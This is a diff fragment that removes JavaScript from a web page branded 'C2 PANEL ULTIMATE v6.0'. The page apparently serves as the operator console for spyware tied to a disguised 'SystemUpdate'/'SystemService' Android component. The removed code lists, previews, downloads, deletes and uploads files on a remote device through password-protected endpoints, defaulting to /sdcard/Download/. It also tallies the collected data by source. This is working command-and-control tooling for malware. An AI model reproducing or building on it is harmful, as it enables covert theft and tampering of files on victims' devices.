-    if(!bytes || bytes===0) return '0 B';
-    if(bytes<1024) return bytes+' B';
-    if(bytes<1048576) return (bytes/1024).toFixed(1)+' KB';
-    if(bytes<1073741824) return (bytes/1048576).toFixed(1)+' MB';
-    return (bytes/1073741824).toFixed(1)+' GB';
-}
-
-function openFileModal(path){
-    var html = '<h3 style="color:#4fc3f7;margin-bottom:6px">📄 '+path.split('/').pop()+'</h3>'+
-               '<p style="color:#8899aa;font-size:10px;margin-bottom:10px">'+path+'</p>'+
-               '<div style="text-align:center;padding:15px;color:#8899aa;">⏳ Loading...</div>';
-    openModal(html);
-    fetch('/data?type=ambil_file&path='+encodeURIComponent(path), {
-        headers: { 'X-Password': PASSWORD }
-    }).then(r=>r.json()).then(data=>{
-        var body = document.getElementById('modalBody');
-        if(data && data.content){
-            var content = data.content;
-            var isImg = content.startsWith('data:image');
-            var isText = !isImg && content.length<50000;
-            var html2 = '<h3 style="color:#4fc3f7;margin-bottom:6px">📄 '+path.split('/').pop()+'</h3>'+
-                       '<p style="color:#8899aa;font-size:10px;margin-bottom:10px">'+path+'</p>';
-            if(isImg) html2 += '<img src="'+content+'" style="max-width:100%;max-height:65vh;border-radius:6px;">';
-            else if(isText) html2 += '<div style="background:#050a12;padding:10px;border-radius:4px;max-height:300px;overflow:auto;font-size:10px;font-family:monospace;color:#c8d6e5;white-space:pre-wrap;">'+content+'</div>';
-            else html2 += '<div style="background:#050a12;padding:10px;border-radius:4px;max-height:300px;overflow:auto;font-size:9px;font-family:monospace;color:#8899aa;word-break:break-all;">Binary file ('+content.length+' chars)</div>';
-            html2 += '<div style="margin-top:10px;display:flex;gap:6px">'+
-                    '<button onclick="downloadFileDirect(\''+path+'\')" style="flex:1;padding:6px;border-radius:4px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;font-family:monospace">📥 Download</button>'+
-                    '<button onclick="closeModal()" style="flex:1;padding:6px;border-radius:4px;border:1px solid #1a2a3f;background:transparent;color:#8899aa;cursor:pointer;font-family:monospace">❌ Close</button></div>';
-            body.innerHTML = html2;
-        } else { body.innerHTML = '<div class="empty-state">❌ Failed to load file</div>'; }
-    }).catch(e=>{ document.getElementById('modalBody').innerHTML = '<div class="empty-state">❌ Error: '+e.message+'</div>'; });
-}
-
-function downloadFile(path){
-    fetch('/data?type=ambil_file&path='+encodeURIComponent(path), {
-        headers: { 'X-Password': PASSWORD }
-    }).then(r=>r.json()).then(data=>{
-        if(data && data.content){
-            var link = document.createElement('a');
-            link.href = data.content;
-            link.download = path.split('/').pop();
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-            addLog('info','📥 Downloaded: '+path);
-        }
-    }).catch(e=>alert('Download failed: '+e.message));
-}
-
-function downloadFileDirect(path){ downloadFile(path); closeModal(); }
-
-function deleteFile(path){
-    if(!confirm('Delete '+path+'?')) return;
-    fetch('/data?type=hapus_file&path='+encodeURIComponent(path), {
-        method: 'DELETE',
-        headers: { 'X-Password': PASSWORD }
-    }).then(r=>r.json()).then(data=>{
-        if(data && data.success){ addLog('info','🗑️ Deleted: '+path); renderFiles(currentFilePath); }
-        else alert('Delete failed');
-    }).catch(e=>alert('Error: '+e.message));
-}
-
-function uploadFile(){
-    var input = document.createElement('input');
-    input.type = 'file';
-    input.onchange = function(e){
-        var file = e.target.files[0];
-        if(!file) return;
-        var reader = new FileReader();
-        reader.onload = function(ev){
-            var data = ev.target.result;
-            var path = prompt('Destination path (e.g. /sdcard/Download/)', '/sdcard/Download/');
-            if(!path) return;
-            fetch('/data?type=upload_file&path='+encodeURIComponent(path+file.name), {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json', 'X-Password': PASSWORD },
-                body: JSON.stringify({data: data, name: file.name})
-            }).then(r=>r.json()).then(d=>{
-                if(d && d.success){ addLog('info','📤 Uploaded: '+file.name); renderFiles(currentFilePath); }
-                else alert('Upload failed');
-            }).catch(e=>alert('Error: '+e.message));
-        };
-        reader.readAsDataURL(file);
-    };
-    input.click();
-}
-
-// ============================================================
-// STATS DETAIL
-// ============================================================
-function renderStats(){
-    var container = document.getElementById('statsDetail');
-    if(!allData.length){ container.innerHTML = '<div class="empty-state">📭 No data yet</div>'; return; }
-    var sources = {};
-    allData.forEach(item=>{
-        var s = item.sumber||'unknown';
-        if(!sources[s]) sources[s]=0;
-        sources[s]++;
-    });
-    var html = '';
-    var sorted = Object.keys(sources).sort((a,b)=>sources[b]-sources[a]);
-    sorted.forEach(key=>{
-        html += '<div style="background:var(--bg-primary);padding:4px 10px;border-radius:4px;border:1px solid var(--border-color);display:flex;justify-content:space-between;align-items:center;font-size:10px">'+
-                '<span>'+key+'</span><span style="color:var(--text-accent);font-weight:700">'+sources[key]+'</span></div>';
-    });
-    container.innerHTML = html;
-}
-
-// ============================================================
-// MODAL
-// ============================================================
-function openModal(content){
-    document.getElementById('modalBody').innerHTML = content;
-    document.getElementById('modal').classList.add('active');
-}
-function closeModal(){
-    document.getElementById('modal').classList.remove('active');
-}
-document.addEventListener('keydown', function(e){ if(e.key==='Escape') closeModal(); });
-
-// ============================================================
-// CONSOLE BRANDING
-// ============================================================
-console.log('☠️ C2 PANEL ULTIMATE v6.0');
-console.log('📊 16 Stats | ⚡ 48 Commands | 🗺️ Map | 📸 Media | 📁 Files');
-console.log('🔌 Integrated with index.html, SystemUpdate.html, SystemService.java');
-console.log('🟢 All systems online.');
+function closeModal() { document.getElementById('modal').classList.remove('active'); }
 </script>
 </body>
 </html>
